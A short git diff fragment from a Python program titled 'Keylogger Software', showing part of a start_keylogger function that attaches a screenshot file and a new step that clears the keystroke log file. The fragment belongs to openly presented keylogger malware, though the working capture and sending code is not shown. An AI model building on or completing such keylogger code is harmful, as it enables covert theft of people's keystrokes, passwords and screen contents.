@@ -223,6 +223,10 @@ def start_keylogger():
         attachment_path_2= file_merge + screenshot_information,
     )
 
+    with open(file_path + extend + keys_information, "w") as f:
+                f.write(' ')
+                f.close()
+
 # Create main window
 root = tk.Tk()
 root.title("Keylogger Software")
